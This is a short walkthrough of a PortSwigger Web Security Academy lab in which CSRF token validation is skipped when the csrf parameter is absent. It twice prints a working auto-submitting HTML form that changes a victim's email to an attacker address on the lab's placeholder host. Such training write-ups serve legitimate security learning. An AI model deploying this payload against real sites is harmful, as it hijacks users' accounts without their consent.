# Lab: CSRF where token validation depends on token being present (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

**Task (from PortSwigger):**  
This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

Credentials: `wiener:peter`

## Vulnerability
Token is checked only if the `csrf` parameter is present. Omitting the parameter entirely skips validation.

## Solution

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

(Do **not** include a `csrf` field.)

## Final Exploit Payload
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```
